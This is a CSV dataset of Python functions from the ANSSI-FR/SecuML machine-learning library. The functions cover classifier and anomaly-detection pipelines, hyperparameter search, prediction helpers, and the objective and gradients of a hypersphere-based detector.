Repository,Function_Name,Function_Code
ANSSI-FR/SecuML,_predict_scores,"def _predict_scores(self, features):
    scoring_func = self.conf.scoring_function()
    all_scores = None
    scores = None
    if scoring_func is not None:
        predicted_scores = getattr(self.pipeline, scoring_func)(features)
        if self.conf.multiclass:
            all_scores = predicted_scores
        else:
            scores = predicted_scores
    return (all_scores, scores)"
ANSSI-FR/SecuML,_predict_from_probas,"def _predict_from_probas(self, matrix, all_probas, probas):
    if self.conf.multiclass:
        return self.pipeline['model'].predict_from_probas(matrix, all_probas)
    else:
        return self.pipeline['model'].predict_from_probas(matrix, probas)"
ANSSI-FR/SecuML,_predict_from_scores,"def _predict_from_scores(self, matrix, all_scores, scores):
    if self.conf.multiclass:
        return self.pipeline['model'].predict_from_scores(matrix, all_scores)
    else:
        return self.pipeline['model'].predict_from_scores(matrix, scores)"
ANSSI-FR/SecuML,_set_best_hyperparam,"def _set_best_hyperparam(self, train_instances):
    hyperparam_conf = self.conf.hyperparam_conf
    param_grid = hyperparam_conf.get_param_grid()
    optim_conf = hyperparam_conf.optim_conf
    cv = StratifiedKFold(n_splits=optim_conf.num_folds)
    grid_search = GridSearchCV(self.pipeline, param_grid=param_grid, scoring=optim_conf.get_scoring_method(), cv=cv, iid=False, n_jobs=optim_conf.n_jobs)
    grid_search.fit(train_instances.features.get_values(), self.conf.get_supervision(train_instances))
    hyperparam_conf.values.set_best_values(grid_search)
    best_values = hyperparam_conf.values.get_best_values()
    best_values = {p: value for (p, value) in best_values.items()}
    self.pipeline.set_params(**best_values)"
ANSSI-FR/SecuML,_fit,"def _fit(self, train_instances):
    self.pipeline.fit(train_instances.features.get_values(), self.conf.get_supervision(train_instances))"
ANSSI-FR/SecuML,training,"def training(self, train_instances):
    exec_time = Classifier.training(self, train_instances)
    if self.conf.multiclass:
        self.class_labels = self.pipeline['model'].classes_
    return exec_time"
ANSSI-FR/SecuML,_set_best_hyperparam,"def _set_best_hyperparam(self, train_instances):
    best_values = self.conf.hyperparam_conf.values.get_best_values()
    self.pipeline.set_params(**best_values)"
ANSSI-FR/SecuML,_predict,"def _predict(self, features, instances_ids):
    predictions = Classifier._predict(self, features, instances_ids)
    predictions.values = predictions.values == -1
    return predictions"
ANSSI-FR/SecuML,_fit,"def _fit(self, train_instances):
    self.pipeline.fit(train_instances.features.get_values())"
ANSSI-FR/SecuML,_predict_scores,"def _predict_scores(self, features):
    (all_scores, scores) = Classifier._predict_scores(self, features)
    if all_scores is not None:
        all_scores = -all_scores
    if scores is not None:
        scores = -scores
    return (all_scores, scores)"
ANSSI-FR/SecuML,_predict_from_scores,"def _predict_from_scores(self, matrix, all_scores, scores):
    if all_scores is not None:
        all_scores = -all_scores
    if scores is not None:
        scores = -scores
    return Classifier._predict_from_scores(self, matrix, all_scores, scores)"
ANSSI-FR/SecuML,_set_best_hyperparam,"def _set_best_hyperparam(self, train_instances):
    best_values = self.conf.hyperparam_conf.values.get_best_values()
    self.pipeline.set_params(**best_values)"
ANSSI-FR/SecuML,_fit,"def _fit(self, train_instances):
    self.pipeline.fit(train_instances.features.get_values(), self.conf.get_supervision(train_instances))"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    return self.classes_.take(np.argmax(probas, axis=1), axis=0)"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('model', _DecisionTree())]"
ANSSI-FR/SecuML,predict_from_scores,"def predict_from_scores(self, X, scores):
    is_inlier = np.full(X.shape[0], -1, dtype=int)
    is_inlier[scores >= 0] = 1
    return is_inlier"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _EllipticEnvelope())]"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    return self.predict(X)"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _GaussianNaiveBayes())]"
ANSSI-FR/SecuML,log_likelihood,"def log_likelihood(self, features, label):
    all_theta = self.pipeline['model'].theta_
    all_sigma = self.pipeline['model'].sigma_
    scaled_features = self.pipeline['scaler'].transform(features)
    label_index = np.where(self.class_labels == label)[0]
    theta = all_theta[label_index, :][0]
    sigma = all_sigma[label_index, :][0]
    probas = scipy.stats.norm(theta, sigma).pdf(scaled_features)
    log_likelihoods = np.sum(np.log(np.maximum(probas, np.finfo(float).eps)), axis=1)
    return log_likelihoods"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    return self.predict(X)"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('model', _GradientBoosting())]"
ANSSI-FR/SecuML,predict_from_scores,"def predict_from_scores(self, X, scores):
    threshold = self.threshold_ if self.behaviour == 'old' else 0
    is_inlier = np.ones(X.shape[0], dtype=int)
    is_inlier[scores < threshold] = -1
    return is_inlier"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('model', _IsolationForest(n_jobs=self.conf.n_jobs, behaviour='new', contamination='auto'))]"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    return self.classes_[np.argmax(probas, axis=1)].ravel()"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _LabelPropagation(n_jobs=self.conf.n_jobs))]"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', LocalOutlierFactor(n_jobs=self.conf.n_jobs, novelty=True))]"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    if probas.shape[1] == 1:
        indices = (probas[:, 1] > 0.5).astype(np.int)
    else:
        indices = probas.argmax(axis=1)
    return self.classes_[indices]"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _LogisticRegression(multi_class='ovr', solver=self.conf.optim_algo, fit_intercept=False))]"
ANSSI-FR/SecuML,predict_from_scores,"def predict_from_scores(self, X, scores):
    is_inlier = np.full(X.shape[0], -1, dtype=int)
    is_inlier[scores >= 0] = 1
    return is_inlier"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('scaler', StandardScaler()), ('model', _OneClassSvm())]"
ANSSI-FR/SecuML,predict_from_probas,"def predict_from_probas(self, X, probas):
    return self.classes_.take(np.argmax(probas, axis=1), axis=0)"
ANSSI-FR/SecuML,_get_pipeline,"def _get_pipeline(self):
    return [('model', _RandomForest())]"
ANSSI-FR/SecuML,predict_label,"def predict_label(x, center, r):
    return predict_score(x, center, r) > 0"
ANSSI-FR/SecuML,predict_score,"def predict_score(x, center, r):
    return square_distance_to_center(x, center) - pow(r, 2)"
ANSSI-FR/SecuML,objective,"def objective(x, unlabeled_features, labeled_features, labels, kappa, nu_u, nu_l):
    (R, gamma, c) = get_values(x)
    num_unlabeled_instances = unlabeled_features.shape[0]
    sum_U = 0
    for i in range(num_unlabeled_instances):
        sum_U += _l(R * R - square_distance_to_center(unlabeled_features[i, :], c))
    sum_L = 0
    num_labeled_instances = labeled_features.shape[0]
    if num_labeled_instances > 0:
        for i in range(num_labeled_instances):
            square_dist = square_distance_to_center(labeled_features[i, :], c)
            sum_L += _l(labels[i] * (R * R - square_dist) - gamma)
    obj = R * R
    obj -= kappa * gamma
    obj += nu_u * sum_U
    obj += nu_l * sum_L
    return obj"
ANSSI-FR/SecuML,distance_to_center,"def distance_to_center(x_i, center):
    return np.linalg.norm(x_i - center)"
ANSSI-FR/SecuML,square_distance_to_center,"def square_distance_to_center(x_i, center):
    return np.dot(x_i - center, x_i - center)"
ANSSI-FR/SecuML,partial_derivatives_r,"def partial_derivatives_r(x_i, x):
    (R, _, c) = get_values(x)
    return 2 * R * l_prime(R * R - square_distance_to_center(x_i, c))"
ANSSI-FR/SecuML,partial_derivatives_c,"def partial_derivatives_c(x_i, x):
    (R, _, c) = get_values(x)
    return 2 * (x_i - c) * l_prime(R * R - square_distance_to_center(x_i, c))"
ANSSI-FR/SecuML,partial_derivatives_r_star,"def partial_derivatives_r_star(x_i, y_i, x):
    (R, gamma, c) = get_values(x)
    square_dist = square_distance_to_center(x_i, c)
    return 2 * y_i * R * l_prime(y_i * (R * R - square_dist) - gamma)"
ANSSI-FR/SecuML,partial_derivatives_gamma_star,"def partial_derivatives_gamma_star(x_i, y_i, x):
    (R, gamma, c) = get_values(x)
    return -l_prime(y_i * (R * R - square_distance_to_center(x_i, c)) - gamma)"
ANSSI-FR/SecuML,partial_derivatives_c_star,"def partial_derivatives_c_star(x_i, y_i, x):
    (R, gamma, c) = get_values(x)
    square_dist = square_distance_to_center(x_i, c)
    return 2 * y_i * (x_i - c) * l_prime(y_i * (R * R - square_dist) - gamma)"
ANSSI-FR/SecuML,gradient_r,"def gradient_r(x, unlabeled_features, labeled_features, labels, nu_u, nu_l):
    (R, _, _) = get_values(x)
    num_unlabeled_instances = unlabeled_features.shape[0]
    sum_U = 0
    for i in range(num_unlabeled_instances):
        sum_U += partial_derivatives_r(unlabeled_features[i, :], x)
    sum_L = 0
    num_labeled_instances = labeled_features.shape[0]
    if num_labeled_instances > 0:
        for i in range(num_labeled_instances):
            sum_L += partial_derivatives_r_star(labeled_features[i, :], labels[i], x)
    return 2 * R + nu_u * sum_U + nu_l * sum_L"
ANSSI-FR/SecuML,gradient_gamma,"def gradient_gamma(x, labeled_features, labels, kappa, nu_l):
    sum_L = 0
    num_labeled_instances = labeled_features.shape[0]
    if num_labeled_instances > 0:
        for i in range(num_labeled_instances):
            sum_L += partial_derivatives_gamma_star(labeled_features[i, :], labels[i], x)
    return -kappa + nu_l * sum_L"
